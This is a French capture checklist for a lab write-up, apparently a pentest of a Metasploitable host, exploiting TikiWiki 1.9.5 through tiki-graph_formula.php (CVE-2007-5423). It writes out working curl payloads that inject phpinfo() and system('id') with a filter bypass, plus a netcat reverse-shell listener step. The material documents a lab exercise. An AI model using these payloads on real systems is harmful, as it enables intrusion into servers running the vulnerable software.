# Captures — TikiWiki 1.9.5 (RCE via tiki-graph_formula.php, port 80)

Consignes de capture pour `services/tikiwiki.html`. Commandes identiques à celles du write-up
source : `ms1/josa/tikiwiki.md`.

> IP de ce poste (josa, réseau `vboxnet0`) : cible `192.168.56.102`, Kali `192.168.56.1`.
> (Le coéquipier est sur `172.28.128.x` — ses captures à lui utiliseront ses propres IP.)

Chaque capture montre **la commande tapée ET son résultat**, terminal entier, prompt visible.
Les encadrés rouges sont ajoutés après coup (traitement d'image), pas pris dans le terminal.

## 01-recon-nmap.png

Commande :
```bash
nmap -sC -sV -p 80 192.168.56.102
```

Encadré en rouge : la ligne `80/tcp open http Apache httpd 2.2.8 ... PHP/5.2.4` — serveur web et
version PHP ancienne qui ouvrent la voie.

## 02-enum-version.png

Les deux commandes à la suite :
```bash
for p in tikiwiki tiki twiki; do curl -s -o /dev/null -w "/$p/ -> %{http_code}\n" "http://192.168.56.102/$p/"; done
curl -s -L http://192.168.56.102/tikiwiki/ | grep -ioE 'TikiWiki [0-9.]+'
```

Encadré en rouge : `/tikiwiki/ -> 302` dans la boucle, et `TikiWiki 1.9.5` en sortie du 2e curl —
l'appli et sa version exacte.

## 03-recherche-cve.png

Les deux commandes à la suite :
```bash
searchsploit tikiwiki graph
msfconsole -q -x "info exploit/unix/webapp/tikiwiki_graph_formula_exec; exit"
```

Encadré en rouge : la ligne `tiki-graph_formula.php` de `searchsploit` et, dans la sortie `info`,
`https://nvd.nist.gov/vuln/detail/CVE-2007-5423`.

## 04-confirm-phpinfo.png

Commande (confirme l'exécution de code PHP, non destructif) :
```bash
curl -s "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=cmd" | grep -ioE 'PHP Version [0-9.]+'
```

Encadré en rouge : `PHP Version 5.2.4` — preuve que `phpinfo()` injecté via `f[]` s'exécute.

## 05-rce-bypass.png

Montre le filtre PUIS son contournement, dans le même terminal :
```bash
# 1) system direct -> rejeté
curl -s "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.system('id')&t=png&title=cmd"
# -> Invalid function call system
# 2) system après x.tan. -> passe
curl -s -G "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&t=png&title=cmd" --data-urlencode "f[]=x.tan.system('id')"
# -> uid=33(www-data) ...
```

Encadré en rouge : `Invalid function call system` (le filtre) et
`uid=33(www-data) gid=33(www-data)` (le contournement réussi).

## 06-reverse-shell.png

Capture du terminal du **listener** (`nc -lvnp 4444`) après déclenchement du reverse shell,
avec les commandes de preuve tapées dans le shell reçu :

- Listener : `nc -lvnp 4444`
- Déclenchement (autre terminal) : le `curl ... f[]=x.tan.system(<chr(...)>)` du write-up (§5)
- Dans le shell reçu : `id`, `uname -a`, `hostname`

Encadré en rouge : le prompt `www-data@metasploitable:/var/www/tikiwiki$` et
`uid=33(www-data) ...` — preuve du shell interactif sur la cible.
